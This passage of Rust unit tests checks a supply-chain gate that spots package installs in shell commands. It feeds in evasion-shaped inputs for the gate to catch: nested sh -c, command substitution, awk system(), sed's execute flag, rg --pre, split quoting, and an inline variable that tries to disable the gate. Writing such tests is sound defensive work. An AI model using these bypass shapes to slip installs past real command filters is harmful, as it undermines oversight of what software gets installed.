        // a package name. `npm install && echo x` is still a bare install.
        for cmd in [
            "npm install && echo done",
            "npm ci && echo done",
            "pnpm install ; echo x",
            "yarn install | tee log",
        ] {
            let v = detect_installs(cmd);
            assert!(
                v.iter().any(|i| i.unvettable.is_some()),
                "`{}` must flag a bare lockfile install",
                cmd
            );
        }
    }

    #[test]
    fn check_verdict_ask_for_lockfile_install_with_flags() {
        // End-to-end: a CI-form lockfile install must NOT be auto-allowed.
        // It carries no package name, so detection yields an unvettable
        // install and `check()` would downgrade to Ask (verified here via
        // detect_installs since `check()` needs config enabled + network).
        let v = detect_installs("npm ci --ignore-scripts && echo done");
        assert_eq!(v.len(), 1);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn pip_install_attached_requirement_form_is_unvettable() {
        // CRITICAL 2 (#111 G1 follow-up): the attached `=` form must be
        // recognised as a requirements indirection, not an ordinary install.
        for cmd in [
            "pip install --requirement=req.txt",
            "pip install -r=req.txt",
        ] {
            let v = detect_installs(cmd);
            assert_eq!(v.len(), 1, "`{}` should yield one install", cmd);
            assert!(
                v[0].unvettable.is_some(),
                "`{}` must be flagged unvettable",
                cmd
            );
        }
    }

    #[test]
    fn pip_install_attached_constraint_form_is_unvettable() {
        for cmd in [
            "pip install --constraint=constraints.txt",
            "pip install -c=constraints.txt",
        ] {
            let v = detect_installs(cmd);
            assert_eq!(v.len(), 1);
            assert!(
                v[0].unvettable.is_some(),
                "`{}` must be flagged unvettable",
                cmd
            );
        }
    }

    #[test]
    fn pip_install_attached_requirement_with_named_pkg_keeps_name() {
        // `--requirement=req.txt foo` names `foo` AND pulls the requirements
        // file — name resolved, install still flagged unvettable.
        let v = detect_installs("pip install --requirement=req.txt foo");
        assert_eq!(v.len(), 1);
        assert_eq!(names(&v[0]), vec!["foo"]);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn split_attached_flag_forms() {
        assert_eq!(split_attached_flag("lodash"), None);
        assert_eq!(split_attached_flag("-r"), Some(("-r", None)));
        assert_eq!(
            split_attached_flag("--requirement=req.txt"),
            Some(("--requirement", Some("req.txt")))
        );
        assert_eq!(
            split_attached_flag("-r=req.txt"),
            Some(("-r", Some("req.txt")))
        );
    }

    #[test]
    fn normal_pip_install_unaffected_by_attached_flag_fix() {
        // Regression: a plain `pip install requests` must still name the
        // package and must NOT be flagged unvettable.
        let v = detect_installs("pip install requests");
        assert_eq!(v.len(), 1);
        assert_eq!(names(&v[0]), vec!["requests"]);
        assert!(v[0].unvettable.is_none());
    }

    #[test]
    fn named_install_with_flags_not_double_counted_as_bare() {
        // `npm install lodash --no-audit` names a package — exactly one
        // install, not also a bare-lockfile detection.
        let v = detect_installs("npm install lodash --no-audit");
        assert_eq!(v.len(), 1);
        assert_eq!(names(&v[0]), vec!["lodash"]);
        assert!(v[0].unvettable.is_none());
    }

    #[test]
    fn yarn_add_not_flagged_as_bare_install() {
        // `yarn add lodash` is a named install, not a bare lockfile install.
        let v = detect_installs("yarn add lodash");
        assert_eq!(v.len(), 1);
        assert_eq!(names(&v[0]), vec!["lodash"]);
        assert!(v[0].unvettable.is_none());
    }

    // --- SEC-I3: parse_iso8601 hardening --------------------------------

    #[test]
    fn parse_iso8601_accepts_valid_rfc3339() {
        assert!(parse_iso8601("2024-01-15T10:30:00Z").is_ok());
        assert!(parse_iso8601("2024-01-15T10:30:00+00:00").is_ok());
        // Missing-Z bare form is conservatively retried.
        assert!(parse_iso8601("2024-01-15T10:30:00").is_ok());
    }

    #[test]
    fn parse_iso8601_rejects_malformed() {
        // Garbage must be an error, never coerced into a bogus value.
        assert!(parse_iso8601("not-a-date").is_err());
        assert!(parse_iso8601("").is_err());
        assert!(parse_iso8601("2024-13-99T99:99:99Z").is_err());
        // A trailing Z on otherwise-malformed input must NOT be "fixed".
        assert!(parse_iso8601("garbageZ").is_err());
    }

    #[test]
    fn parse_iso8601_rejects_far_future_timestamp() {
        // A package published >1d in the future is untrustworthy — the old
        // code clamped age to zero and waved it through. Must be Err now.
        let future = (Utc::now() + ChronoDuration::days(400)).to_rfc3339();
        assert!(
            parse_iso8601(&future).is_err(),
            "far-future timestamp must be rejected, not clamped"
        );
        // A timestamp slightly in the future (clock skew) is still accepted.
        let near = (Utc::now() + ChronoDuration::hours(2)).to_rfc3339();
        assert!(parse_iso8601(&near).is_ok());
    }

    #[test]
    fn parse_iso8601_rejects_implausibly_old_timestamp_231() {
        assert!(
            parse_iso8601("1970-01-01T00:00:00Z").is_err(),
            "registry publish dates predating public package registries are not trustworthy"
        );
    }

    // --- SEC-I2: package cap --------------------------------------------

    #[test]
    fn http_max_bytes_lowered_from_64mb() {
        // Regression guard: the per-response cap must stay well under the
        // old 64 MB. A hostile registry must not be able to stream 64 MB
        // per package into the short-lived hook process.
        assert!(
            HTTP_MAX_BYTES <= 16 * 1024 * 1024,
            "HTTP_MAX_BYTES must be lowered from the old 64MB"
        );
    }

    #[test]
    fn package_cap_constant_is_sane() {
        // The cap should be a small, reviewable number — not unbounded.
        assert!(MAX_PACKAGES_PER_CHECK > 0 && MAX_PACKAGES_PER_CHECK <= 50);
    }

    #[test]
    fn many_packages_exceed_cap() {
        // A command naming more than the cap of distinct packages must be
        // detectable as over-cap. We count via detect_installs (check()
        // itself needs config+network).
        let pkgs: Vec<String> = (0..MAX_PACKAGES_PER_CHECK + 5)
            .map(|i| format!("pkg{}", i))
            .collect();
        let cmd = format!("npm install {}", pkgs.join(" "));
        let installs = detect_installs(&cmd);
        let total: usize = installs.iter().map(|i| i.packages.len()).sum();
        assert!(
            total > MAX_PACKAGES_PER_CHECK,
            "expected over-cap package count, got {}",
            total
        );
    }

    #[test]
    fn check_budget_constant_is_bounded() {
        // The aggregate wall-clock budget must be a finite, sane value so a
        // hostile registry cannot stall the hook indefinitely.
        assert!(CHECK_WALL_BUDGET.as_secs() > 0 && CHECK_WALL_BUDGET.as_secs() <= 60);
    }

    #[test]
    fn osv_severity_extracts_from_database_specific() {
        let v: Value =
            serde_json::from_str(r#"{"database_specific":{"severity":"MODERATE"}}"#).unwrap();
        assert_eq!(osv_severity(&v), Severity::Medium);

        let v: Value =
            serde_json::from_str(r#"{"severity":[{"score":"CVSS:3.1/.../A:H CRITICAL"}]}"#)
                .unwrap();
        assert_eq!(osv_severity(&v), Severity::Critical);

        // No severity info → default High (so it doesn't slip past a HIGH threshold).
        let v: Value = serde_json::from_str(r#"{"id":"OSV-2024"}"#).unwrap();
        assert_eq!(osv_severity(&v), Severity::High);
    }

    // ─── Shell-quote tokeniser bypass guards (#140) ────────────────────────
    //
    // Codex + Antigravity peer review of PR #139 flagged a HIGH bypass class:
    // the naive tokeniser does not honour shell quoting, so several install
    // shapes slip past the gate. These tests pin the closure.

    #[test]
    fn quoted_sh_c_install_detected() {
        // `sh -c '<install>'` wraps an install in a quoted argument. The
        // outer regex pass cannot see the verb because the quotes hide it
        // (and `&&` inside the quotes would split the outer scan). The
        // tokeniser must surface the inner command as a recursable segment.
        let v = detect_installs(r#"sh -c 'npm install left-pad'"#);
        assert_eq!(v.len(), 1, "sh -c '<install>' must be detected");
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert_eq!(names(&v[0]), vec!["left-pad"]);
    }

    #[test]
    fn quoted_bash_c_install_detected() {
        // Same shape, double quotes, `bash -c`.
        let v = detect_installs(r#"bash -c "pip install requests==2.31.0""#);
        assert_eq!(v.len(), 1, "bash -c \"<install>\" must be detected");
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert_eq!(v[0].packages[0].0, "requests");
        assert_eq!(v[0].packages[0].1.as_deref(), Some("2.31.0"));
    }

    #[test]
    fn command_substitution_install_detected() {
        // `$(...)` evaluates its body. A reasonable adversary writes
        // `eval "$(npm install evil)"` or similar. The gate must surface
        // the substituted command so its install verb is vetted.
        let v = detect_installs(r#"eval "$(npm install evil-pkg)""#);
        assert!(
            !v.is_empty(),
            "$(npm install ...) substitution must surface the inner install"
        );
        assert!(
            v.iter()
                .any(|i| i.packages.iter().any(|(n, _)| n == "evil-pkg")),
            "inner install must be detected, got: {:?}",
            v
        );
    }

    #[test]
    fn backtick_substitution_install_detected() {
        // Backtick substitution is the older, still-valid form of $(...).
        let v = detect_installs("echo `npm install left-pad`");
        assert!(
            !v.is_empty(),
            "backtick substitution must surface the inner install"
        );
        assert!(
            v.iter()
                .any(|i| i.packages.iter().any(|(n, _)| n == "left-pad")),
            "backtick inner install must be detected, got: {:?}",
            v
        );
    }

    #[test]
    fn quoted_head_install_detected() {
        // The installer verb itself can be quoted: `'npm' install foo` is a
        // valid invocation. The tokeniser must strip the quotes before the
        // head is matched against `npm`/`pnpm`/`yarn`.
        let v = detect_installs(r#"'npm' install lodash"#);
        assert_eq!(v.len(), 1, "quoted-head install must be detected");
        assert_eq!(names(&v[0]), vec!["lodash"]);

        let v = detect_installs(r#""pip" install requests"#);
        assert_eq!(
            v.len(),
            1,
            "double-quoted-head pip install must be detected"
        );
        assert_eq!(names(&v[0]), vec!["requests"]);
    }

    #[test]
    fn quoted_operator_in_flag_value_does_not_truncate_scan() {
        // The package-list regex `[^|;&<>]+` stops at the literal `&` in
        // `--description="install & test"`. The quote-aware tokeniser must
        // mask operators inside quoted regions so the package name `lodash`
        // following the flag is still captured.
        let v = detect_installs(r#"npm install --description="install & test" lodash"#);
        assert_eq!(
            v.len(),
            1,
            "operator inside quotes must not truncate the scan"
        );
        assert!(
            names(&v[0]).contains(&"lodash"),
            "lodash should still be captured past the quoted operator, got: {:?}",
            names(&v[0])
        );
    }

    #[test]
    fn ansi_c_quoted_install_detected() {
        // `$'...'` is the ANSI-C quote form. Treat it like a single-quoted
        // literal for tokenising — escape sequences are not expanded by the
        // gate (close enough; we only need the verb to surface).
        let v = detect_installs(r#"sh -c $'npm install lodash'"#);
        assert_eq!(v.len(), 1, "ANSI-C $'...' wrapped install must be detected");
        assert_eq!(names(&v[0]), vec!["lodash"]);
    }

    #[test]
    fn quoted_install_as_data_argument_still_flagged() {
        // `echo "$(npm install foo)"` — the substitution payload is data
        // here (echo prints whatever npm wrote to stdout), but the shell
        // STILL runs the inner `npm install foo`. We choose to flag it
        // because the install side-effect happens before echo runs.
        // Documenting the decision: be conservative — the install ran.
        let v = detect_installs(r#"echo "$(npm install foo)""#);
        assert!(
            !v.is_empty(),
            "$(npm install foo) inside double quotes still executes the install \
             and must be surfaced (conservative — fail closed)"
        );
        assert!(
            v.iter().any(|i| i.packages.iter().any(|(n, _)| n == "foo")),
            "inner install package must be named, got: {:?}",
            v
        );
    }

    // ─── PR #146 peer-review follow-ups ──────────────────────────────────
    //
    // Both Codex and agy reviewed PR #146 (head 32fb6b2) and surfaced
    // 2 BLOCKERs + 1 HIGH + 1 LOW. Pinned below to prevent regression.

    #[test]
    fn quoted_install_verb_detected() {
        // BLOCKER (both reviewers, #146): `npm 'install' lodash` and
        // `pip "install" requests` were silently dropped — the regex did
        // not allow quotes around the SUBCOMMAND, so it missed; the bare
        // scan then saw a package after the quoted verb and flipped
        // has_package=true. Fix: optional `['"]?` around the subcommand.
        let v = detect_installs(r#"npm 'install' lodash"#);
        assert_eq!(v.len(), 1, "npm 'install' lodash must be detected: {v:?}");
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert!(
            v[0].packages.iter().any(|(n, _)| n == "lodash"),
            "must capture lodash"
        );
    }

    #[test]
    fn double_quoted_install_verb_detected() {
        let v = detect_installs(r#"pip "install" requests"#);
        assert_eq!(v.len(), 1, r#"pip "install" requests must be detected"#);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].packages.iter().any(|(n, _)| n == "requests"));
    }

    #[test]
    fn quoted_install_verb_combined_with_quoted_head() {
        let v = detect_installs(r#"'npm' 'install' lodash"#);
        assert_eq!(v.len(), 1, "both head and verb quoted must still detect");
        assert!(v[0].packages.iter().any(|(n, _)| n == "lodash"));
    }

    #[test]
    fn bash_lc_combined_option_install_detected() {
        // HIGH (agy + Codex, #146): combined short options like `bash -lc`
        // skipped recursion because the original exact-`-c` match only
        // matched the canonical form. Now any `-[chars]c` cluster fires.
        let v = detect_installs(r#"bash -lc 'npm install evil'"#);
        assert!(
            v.iter()
                .any(|i| i.packages.iter().any(|(n, _)| n == "evil")),
            "bash -lc must recurse: {v:?}"
        );
    }

    #[test]
    fn bash_xc_combined_option_install_detected() {
        let v = detect_installs(r#"bash -xc 'npm install nasty'"#);
        assert!(
            v.iter()
                .any(|i| i.packages.iter().any(|(n, _)| n == "nasty")),
            "bash -xc must recurse: {v:?}"
        );
    }

    #[test]
    fn bash_separate_options_install_detected() {
        // `bash -x -c '<install>'` — option before `-c`, separate tokens.
        let v = detect_installs(r#"bash -x -c 'npm install sep'"#);
        assert!(
            v.iter().any(|i| i.packages.iter().any(|(n, _)| n == "sep")),
            "bash -x -c (separate options) must recurse: {v:?}"
        );
    }

    #[test]
    fn recursion_depth_limit_surfaces_unvettable_not_skip() {
        // BLOCKER (agy + Codex, #146): the original `if depth < MAX_RECURSION_DEPTH`
        // silently dropped recursion segments at depth >= 6. This
        // fail-OPEN behaviour meant a 7-deep nest could auto-allow.
        // Now: at the cap, if recursion segments still exist, surface an
        // Unvettable so the caller fails CLOSED.
        // Build a payload nested 7 deep — each `sh -c "$(…)"` layer
        // contributes depth.
        let mut payload = "npm install deeply-nested".to_string();
        for _ in 0..7 {
            payload = format!(r#"sh -c "$({})""#, payload);
        }
        let v = detect_installs(&payload);
        assert!(
            !v.is_empty(),
            "depth-cap must surface at least one ParsedInstall (Unvettable), not silently Skip"
        );
        // At least one item must be the Unvettable depth-cap marker AND
        // it must be labelled `Ecosystem::Unknown`, not the historical
        // hardcoded `Npm` (see #147 — a deep-nested PyPI / mixed payload
        // was being mislabelled `[npm]` in the surfaced finding).
        let cap_marker = v.iter().find(|i| {
            i.unvettable
                .as_deref()
                .is_some_and(|s| s.contains("recursion depth limit"))
        });
        assert!(cap_marker.is_some(), "depth-cap marker missing: {v:?}");
        assert_eq!(
            cap_marker.unwrap().ecosystem,
            Ecosystem::Unknown,
            "depth-cap marker must be Ecosystem::Unknown (#147), not Npm"
        );
        assert!(
            v.iter().any(|i| i
                .unvettable
                .as_deref()
                .is_some_and(|s| s.contains("recursion depth limit"))),
            "depth-cap Unvettable marker missing: {v:?}"
        );
    }

    #[test]
    fn dedup_collapses_reordered_package_lists() {
        // LOW (agy, #146): dedup compared package lists with order-strict
        // `==`. Sort-before-compare collapses semantically identical
        // installs. Pin: `npm install a b && npm install b a` should
        // dedupe to one ParsedInstall.
        let v = detect_installs("npm install a b && npm install b a");
        assert_eq!(
            v.len(),
            1,
            "reordered duplicate must collapse to one detection: {v:?}"
        );
    }

    #[test]
    fn nested_sh_c_install_detected() {
        // Defence in depth: nesting `sh -c` inside `bash -c` is a known
        // adversarial shape (PR #139 review). The recursion must walk both
        // layers.
        let v = detect_installs(r#"bash -c 'sh -c "npm install nested"'"#);
        assert!(
            v.iter()
                .any(|i| i.packages.iter().any(|(n, _)| n == "nested")),
            "nested sh -c install must be detected, got: {:?}",
            v
        );
    }

    #[test]
    fn bash_c_double_dash_install_detected() {
        let v = detect_installs("bash -c -- 'cd /tmp && sh -c \"npm install\"'");
        assert!(
            !v.is_empty(),
            "nested bare install under double dash -- must be detected: {v:?}"
        );

        let v2 = detect_installs("bash -cce 'npm install lodash'");
        assert!(!v2.is_empty(), "bash -cce must be detected: {v2:?}");
    }

    #[test]
    fn unmatched_quote_falls_back_safely() {
        // A malformed command with an unmatched quote must not panic and
        // must not silently swallow an install. Best effort: treat the
        // remainder as one big quoted token. The result is allowed to be
        // empty (no detection) — what matters is no panic.
        let _ = detect_installs(r#"sh -c 'npm install foo"#);
        let _ = detect_installs(r#"echo \"npm install foo"#);
        // No assertion on contents — we only require this not to crash.
    }

    #[test]
    fn shell_tokens_strips_single_quotes() {
        // Direct tokeniser unit test: `'npm'` -> token text `npm`.
        let toks = shell_tokens(r#"'npm' install"#).expect("balanced shell words");
        assert_eq!(toks.len(), 2);
        assert_eq!(toks[0].1, "npm");
        assert_eq!(toks[1].1, "install");
    }

    #[test]
    fn shell_tokens_strips_double_quotes() {
        let toks = shell_tokens(r#""pip" install"#).expect("balanced shell words");
        assert_eq!(toks.len(), 2);
        assert_eq!(toks[0].1, "pip");
        assert_eq!(toks[1].1, "install");
    }

    #[test]
    fn shell_tokens_preserves_operators_in_unquoted_regions() {
        // Regression guard: the operator-splitting behaviour must survive
        // for unquoted regions. `npm install x && echo y` must still split
        // the `&&` as its own token.
        let toks = shell_tokens("npm install x && echo y").expect("balanced shell words");
        let ops: Vec<&str> = toks.iter().map(|(_, s)| s.as_str()).collect();
        assert!(
            ops.contains(&"&&"),
            "unquoted && must split as its own token, got: {:?}",
            ops
        );
    }

    #[test]
    fn shell_tokens_keeps_operators_inside_quotes_attached() {
        // `'a && b'` is one token whose text is `a && b`.
        let toks = shell_tokens(r#"foo 'a && b' bar"#).expect("balanced shell words");
        let texts: Vec<&str> = toks.iter().map(|(_, s)| s.as_str()).collect();
        assert!(
            texts.iter().any(|t| t.contains("&&")),
            "operator inside single quotes must stay inside the token, got: {:?}",
            texts
        );
        // And `&&` must NOT appear as its own token.
        assert!(
            !texts.contains(&"&&"),
            "&& inside single quotes must not split, got: {:?}",
            texts
        );
    }

    // ─── #141: plaintext false-positive guard (data-utility allowlist) ──────
    //
    // The supply-chain regexes match install-shaped substrings anywhere in a
    // command, including inside the ARGUMENTS of ordinary data-consuming
    // utilities. Hit live on 2026-05-23: `echo "/usr/bin/npm install foo"` is
    // just data printed to stdout, but the gate treated the substring as a
    // real install verb and blocked.
    //
    // Fix: head-verb allowlist (echo, printf, cat, tac, tee, grep, egrep,
    // fgrep, head, tail, nl, base64, xxd, od, hexdump, jq — all execution-
    // incapable; rg/awk/gawk/sed deliberately excluded, see #148). When the
    // head of a command segment basename-normalises to one of these, the
    // segment bytes are
    // overwritten with ASCII spaces in a same-length working copy before the
    // install-detection regexes run. Byte offsets are preserved so the
    // existing regex prefix-anchors and `claimed`-span dedup keep working.
    //
    // Re-implementation of #141 on top of develop @ c4f6e55, composing
    // cleanly with the now-merged #142/#143/#146 changes (line-continuation
    // preprocess, quote-aware tokeniser, recursion + depth-cap).

    #[test]
    fn echo_with_install_substring_is_not_an_install() {
        // The classic FP — observed in live peer review on 2026-05-23.
        let v = detect_installs(r#"echo "/usr/bin/npm install foo""#);
        assert!(
            v.is_empty(),
            "echo printing an install-shaped string must not trigger the gate, got: {:?}",
            v
        );
    }

    #[test]
    fn grep_with_install_substring_is_not_an_install() {
        let v = detect_installs(r#"grep "/opt/bin/pip install" README.md"#);
        assert!(
            v.is_empty(),
            "grep searching for an install-shaped pattern must not trigger the gate, got: {:?}",
            v
        );
    }

    #[test]
    fn printf_format_is_not_an_install() {
        let v = detect_installs(r#"printf '%s\n' "npm install lodash""#);
        assert!(
            v.is_empty(),
            "printf data argument must not trigger the gate, got: {:?}",
            v
        );
    }

    #[test]
    fn cat_with_install_substring_is_not_an_install() {
        let v = detect_installs(r#"cat /tmp/notes.txt # contains npm install foo"#);
        assert!(
            v.is_empty(),
            "cat reading a file with install-shaped content must not trigger, got: {:?}",
            v
        );
    }

    // ─── #148 round-1 BLOCKER (agy) — execution-capable utilities excluded ─

    #[test]
    fn awk_system_call_install_must_be_detected_not_masked() {
        // `awk 'BEGIN { system("...") }'` is a real command-execution path.
        // If awk were in DATA_CONSUMING_UTILITIES, the entire segment would
        // be masked to spaces and the install would silently bypass. This
        // test pins awk OUT of the allowlist.
        let v = detect_installs(r#"awk 'BEGIN { system("npm install evil") }'"#);
        assert!(
            !v.is_empty(),
            "awk segment must NOT be masked — system() can spawn an install: {v:?}"
        );
    }

    #[test]
    fn gawk_system_call_install_must_be_detected_not_masked() {
        let v = detect_installs(r#"gawk 'BEGIN { system("pip install bad") }'"#);
        assert!(
            !v.is_empty(),
            "gawk system() install must not be masked: {v:?}"
        );
    }

    #[test]
    fn sed_exec_flag_install_must_be_detected_not_masked() {
        // GNU sed's `s///e` flag executes the replacement as a shell command.
        let v = detect_installs(r#"sed 's/.*/npm install nasty/e' /tmp/x"#);
        assert!(
            !v.is_empty(),
            "sed `e` flag install must not be masked — sed can spawn shell: {v:?}"
        );
    }

    // ─── #148 round-1 MEDIUM (agy) — allowlist coverage additions ──────────

    #[test]
    fn jq_with_install_substring_is_not_an_install() {
        let v = detect_installs(r#"jq '.scripts | select(. == "npm install foo")' package.json"#);
        assert!(
            v.is_empty(),
            "jq filter is data processing, not install: {v:?}"
        );
    }

    #[test]
    fn base64_with_install_substring_is_not_an_install() {
        let v = detect_installs(r#"base64 -d <<< "bnBtIGluc3RhbGwgZm9v""#);
        assert!(v.is_empty(), "base64 decode is data, not install: {v:?}");
    }

    #[test]
    fn xxd_with_install_substring_is_not_an_install() {
        let v = detect_installs(r#"xxd /tmp/notes # echoes hex of 'pip install x'"#);
        assert!(v.is_empty(), "xxd is data, not install: {v:?}");
    }

    #[test]
    fn od_with_install_substring_is_not_an_install() {
        let v = detect_installs(r#"od -c /tmp/log | grep 'npm install'"#);
        assert!(
            v.is_empty(),
            "od piped to grep — both data utilities, not an install: {v:?}"
        );
    }

    #[test]
    fn hexdump_with_install_substring_is_not_an_install() {
        let v = detect_installs(r#"hexdump -C /tmp/payload"#);
        assert!(v.is_empty(), "hexdump is data, not install: {v:?}");
    }

    // ─── #148 round-3 (agy) — explicit masking coverage for the rest of
    //     DATA_CONSUMING_UTILITIES (tac, tee, egrep, fgrep, head, tail, nl).
    //     Round-2 only pinned the exec-capable removals and the high-traffic
    //     data utilities. These seven were silently relying on indirect
    //     coverage; pin them here so future trims of the allowlist surface as
    //     an obvious test failure.

    #[test]
    fn tac_with_install_substring_is_not_an_install() {
        let v = detect_installs(r#"tac /tmp/log # contains 'npm install foo'"#);
        assert!(v.is_empty(), "tac is reverse-cat, pure data: {v:?}");
    }

    #[test]
    fn tee_with_install_substring_is_not_an_install() {
        let v = detect_installs(r#"echo data | tee /tmp/out # 'pip install x' in body"#);
        // `tee` is the head of the post-pipe segment; both `echo` and `tee`
        // are data utilities, so neither segment must trigger detection.
        assert!(
            v.is_empty(),
            "tee writes stdin to file+stdout, no exec: {v:?}"
        );
    }

    #[test]
    fn egrep_with_install_substring_is_not_an_install() {
        let v = detect_installs(r#"egrep "npm install|pip install" /tmp/notes"#);
        assert!(v.is_empty(), "egrep is grep -E, no exec: {v:?}");
    }

    #[test]
    fn fgrep_with_install_substring_is_not_an_install() {
        let v = detect_installs(r#"fgrep "npm install foo" /tmp/notes"#);
        assert!(v.is_empty(), "fgrep is grep -F, no exec: {v:?}");
    }

    #[test]
    fn head_with_install_substring_is_not_an_install() {
        let v = detect_installs(r#"head -20 /tmp/install-instructions.md"#);
        assert!(v.is_empty(), "head prints first N lines, no exec: {v:?}");
    }

    #[test]
    fn tail_with_install_substring_is_not_an_install() {
        let v = detect_installs(r#"tail -f /var/log/npm-install.log"#);
        assert!(v.is_empty(), "tail prints last N lines, no exec: {v:?}");
    }

    #[test]
    fn nl_with_install_substring_is_not_an_install() {
        let v = detect_installs(r#"nl /tmp/notes # numbered 'npm install foo'"#);
        assert!(v.is_empty(), "nl numbers lines, no exec: {v:?}");
    }

    #[test]
    fn rg_pre_install_must_be_detected_not_masked() {
        // Codex BLOCKER on #148: `rg --pre <executable>` runs the named
        // executable as a preprocessor on every file. If `rg` were on the
        // allowlist, the segment would be masked and the install hidden.
        // `rg` is OUT of DATA_CONSUMING_UTILITIES for this reason.
        // (A plain `rg "<pattern>" src/` is also no longer masked — that
        //  produces a false-positive Ask in the rare case the pattern is
        //  install-shaped. Net: better to over-Ask than under-detect.)
        let v = detect_installs(r#"rg --pre /tmp/installer.sh 'npm install evil'"#);
        assert!(
            !v.is_empty(),
            "rg --pre install must NOT be masked — preprocessor can spawn shell: {v:?}"
        );
    }

    // ─── #141: positive guards — these MUST NOT regress ─────────────────────

    #[test]
    fn plain_npm_install_still_detected_141() {
        // Sanity: the data-utility guard must not break the base case.
        let v = detect_installs("npm install foo");
        assert_eq!(v.len(), 1, "vanilla npm install must still be detected");
        assert_eq!(names(&v[0]), vec!["foo"]);
    }

    #[test]
    fn abs_path_npm_install_still_detected_141() {
        // The absolute-path bypass closed by #139 must remain closed —
        // the guard must not regress it.
        let v = detect_installs("/usr/local/bin/npm install foo");
        assert_eq!(v.len(), 1, "abs-path npm install must still be detected");
        assert_eq!(names(&v[0]), vec!["foo"]);
    }

    #[test]
    fn chain_after_data_utility_still_detected_141() {
        // `cd` is not in the data-utility list (cd is a stateful builtin,
        // not data-printing). The second segment after `&&` MUST be
        // evaluated independently.
        let v = detect_installs("cd foo && npm install bar");
        assert_eq!(v.len(), 1, "install after && must still be detected");
        assert_eq!(names(&v[0]), vec!["bar"]);
    }

    #[test]
    fn echo_chained_with_real_install_still_detects_install_141() {
        // Tricky chain: the LEFT segment is suppressed (echo head), the
        // RIGHT segment is a real install and must be detected.
        let v = detect_installs(r#"echo "x" && npm install foo"#);
        assert_eq!(
            v.len(),
            1,
            "real install after && must survive even when left segment is suppressed, got: {:?}",
            v
        );
        assert_eq!(names(&v[0]), vec!["foo"]);
    }

    #[test]
    fn pipe_into_install_is_detected_141() {
        // `echo foo | npm install bar` — npm is the head of the right-hand
        // pipe segment (it's being invoked, with `foo` piped into stdin),
        // so the install MUST be detected.
        let v = detect_installs("echo foo | npm install bar");
        assert_eq!(
            v.len(),
            1,
            "npm as RHS-of-pipe head must still be detected, got: {:?}",
            v
        );
        assert_eq!(names(&v[0]), vec!["bar"]);
    }

    #[test]
    fn semicolon_chain_with_data_utility_141() {
        // `;` is a segment boundary, same as `&&`.
        let v = detect_installs(r#"echo "npm install foo" ; npm install real"#);
        assert_eq!(
            v.len(),
            1,
            "echo suppressed, second segment must detect, got: {:?}",
            v
        );
        assert_eq!(names(&v[0]), vec!["real"]);
    }

    #[test]
    fn data_utility_with_abs_path_head_is_suppressed_141() {
        // The head check must basename-normalise — `/bin/echo "..."` is
        // still an echo head.
        let v = detect_installs(r#"/bin/echo "/usr/bin/npm install foo""#);
        assert!(
            v.is_empty(),
            "abs-path echo head must still be recognised as a data utility, got: {:?}",
            v
        );
    }

    #[test]
    fn command_head_is_data_utility_unit() {
        // Direct unit test on the helper, in case it's reused.
        assert!(command_head_is_data_utility("echo foo"));
        assert!(command_head_is_data_utility("  echo foo"));
        assert!(command_head_is_data_utility("printf '%s' x"));
        assert!(command_head_is_data_utility("grep pattern file"));
        assert!(command_head_is_data_utility("/bin/echo hi"));
        assert!(command_head_is_data_utility("/usr/bin/cat foo"));

        assert!(!command_head_is_data_utility("npm install foo"));
        assert!(!command_head_is_data_utility("/usr/bin/npm install foo"));
        assert!(!command_head_is_data_utility("pip install x"));
        assert!(!command_head_is_data_utility(""));
        assert!(!command_head_is_data_utility("   "));
        // `cd` is a stateful builtin, not a data utility — its segment is
        // benign because it has no install verb, but it must not be on
        // the allowlist (otherwise `cd && npm install` semantics get
        // muddied if cd ever gains install-shaped argv).
        assert!(!command_head_is_data_utility("cd foo"));
    }

    #[test]
    fn issue_227_command_text_cannot_disable_enabled_gate() {
        let mut config = Config::default();
        config.supply_chain.enabled = true;
        let verdict = check_with_config("CONTEXTCRAWLER_SUPPLY_CHAIN=off npm install", &config);
        assert!(
            matches!(verdict, Verdict::Ask(_)),
            "the command text is attacker-controlled and must not disable the gate"
        );
    }

    #[test]
    fn issue_227_default_off_remains_a_noop() {
        assert!(matches!(
            check_with_config("npm install", &Config::default()),
            Verdict::Skip
        ));
    }

    #[test]
    fn issue_227_enabled_gate_still_allows_configured_benign_package() {
        let mut config = Config::default();
        config.supply_chain.enabled = true;
        config.overrides.always_allow.push("left-pad".to_string());
        assert!(matches!(
            check_with_config("npm install left-pad", &config),
            Verdict::Allow
        ));
    }

    #[test]
    fn issue_227_render_does_not_suggest_command_text_bypass() {
        let output = render(&Verdict::Ask(Vec::new()));
        assert!(!output.contains("CONTEXTCRAWLER_SUPPLY_CHAIN=off"));
        assert!(output.contains("confirm explicitly"));
    }

    #[test]
    fn http_err_5xx_is_retryable() {
        for code in [500u16, 502, 503, 504, 599] {
            assert!(
                is_retryable_http_err_tag(HttpErrTag::Status(code)),
                "5xx must be retryable: {}",
                code
            );
        }
    }

    #[test]
    fn http_err_4xx_is_not_retryable() {
        // Terminal request failures remain terminal. Rate limiting is tested
        // separately because it is transient and must be retried (#231).
        for code in [400u16, 401, 403, 404, 422] {
            assert!(
                !is_retryable_http_err_tag(HttpErrTag::Status(code)),
                "4xx must NOT be retryable: {}",
                code
            );
        }
    }

    #[test]
    fn http_err_429_is_retryable_231() {
        assert!(
            is_retryable_http_err_tag(HttpErrTag::Status(429)),
            "rate limiting is transient and must retain the bounded retry/backoff path"
        );
    }

    #[test]
    fn issue_227_reconstructs_concatenated_quoted_words() {
        let installs = detect_installs("n'p'm in'st'all evil");
        assert_eq!(
            installs.len(),
            1,
            "quoted fragments must not hide an install"
        );
        assert_eq!(names(&installs[0]), vec!["evil"]);
    }

    #[test]
    fn issue_227_parses_manager_global_options_before_install() {
        let npm = detect_installs("npm --prefix /tmp install evil");
        assert_eq!(npm.len(), 1, "npm --prefix must not hide install");
        assert_eq!(names(&npm[0]), vec!["evil"]);

        let pip = detect_installs("pip --isolated install evil");
        assert_eq!(pip.len(), 1, "pip --isolated must not hide install");
        assert_eq!(names(&pip[0]), vec!["evil"]);
    }

    #[test]
    fn issue_227_recurses_into_process_substitution() {
        let installs = detect_installs("cat <(npm install evil)");
        assert_eq!(
            installs.len(),
            1,
            "executed process substitutions must be vetted"
        );
        assert_eq!(names(&installs[0]), vec!["evil"]);
    }

    #[test]
